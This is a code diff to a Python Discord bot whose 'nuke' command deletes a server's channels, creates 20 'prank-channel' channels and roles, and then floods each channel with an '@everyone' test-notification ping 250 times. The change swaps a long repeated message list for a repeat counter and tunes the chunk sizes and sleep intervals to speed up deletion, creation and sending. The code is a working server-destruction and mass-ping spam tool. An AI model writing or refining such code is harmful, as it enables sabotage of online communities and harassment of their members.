@@ -4,6 +4,7 @@ import asyncio
 import logging
 from datetime import datetime
 from typing import List
+import threading
 
 import discord
 from discord.ext import commands
@@ -20,75 +21,20 @@ INTENTS.message_content = True
 # Behavioral params
 ROLE_BASE = "ozeumember"
 ROLE_COUNT = 5
-
 CHANNEL_BASE = "prank-channel"
 CHANNEL_COUNT = 20
 
-CHANNEL_MESSAGES = [
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-    "@everyone テスト通知です！",
-]
+REPEAT_MESSAGE = "@everyone テスト通知です！"
+REPEAT_COUNT = 250  # 各チャンネルに送信する回数
 
 # Parallelism / timing
 DELETE_CHUNK_SIZE = 8
 DELETE_CHUNK_SLEEP = 0.08
-
 CREATE_CHUNK_SIZE = 6
 CREATE_CHUNK_SLEEP = 0.12
-
 MSG_CHUNK_SIZE = 10
 MSG_INTER_CHUNK_SLEEP = 0.01
 MSG_INTER_ROUND_SLEEP = 0.02
-MSG_MAX_RETRIES = 3
-
 POST_DELETE_WAIT = 3.0
 # ---------------------------------------
 
@@ -129,7 +75,7 @@ async def safe_create_channel(guild: discord.Guild, name: str):
         logger.warning(f"Create failed {name}: {e}")
         return None
 
-async def safe_send(ch: discord.TextChannel, content: str, max_retries=MSG_MAX_RETRIES):
+async def safe_send(ch: discord.TextChannel, content: str, max_retries=3):
     if not ch or not content:
         return
     retries = 0
@@ -150,15 +96,11 @@ async def safe_send(ch: discord.TextChannel, content: str, max_retries=MSG_MAX_R
             logger.exception(f"Unexpected send error {ch.name}: {e}")
             return
 
-async def send_messages_round_robin(channels: List[discord.TextChannel], messages: List[str]):
-    if not channels:
-        logger.warning("No channels to send to")
+async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
+    if not channels or not msg:
         return
-    n_channels = len(channels)
-    n_rounds = len(messages)
-    for r in range(n_rounds):
-        msg = messages[r]
-        for i in range(0, n_channels, MSG_CHUNK_SIZE):
+    for _ in range(repeat):
+        for i in range(0, len(channels), MSG_CHUNK_SIZE):
             chunk = channels[i:i+MSG_CHUNK_SIZE]
             await asyncio.gather(*(safe_send(ch, msg) for ch in chunk))
             await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
@@ -236,14 +178,13 @@ async def nuke(ctx):
         await asyncio.sleep(CREATE_CHUNK_SLEEP)
     await backup_channel.send(f"🆕 チャンネル作成完了 {len(created_channels)} 件")
 
-    # SEND messages
-    await backup_channel.send(f"✉️ 各チャンネルにメッセージ送信開始")
-    await send_messages_round_robin(created_channels, CHANNEL_MESSAGES)
+    # SEND repeated messages
+    await backup_channel.send(f"✉️ 各チャンネルに同じメッセージを {REPEAT_COUNT} 回送信開始")
+    await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
     await backup_channel.send("✅ nuke 全工程完了")
 
 # Entrypoint
 if __name__ == "__main__":
-    import threading
     flask_thread = threading.Thread(target=start_flask, daemon=True)
     flask_thread.start()
     logger.info("Flask started")
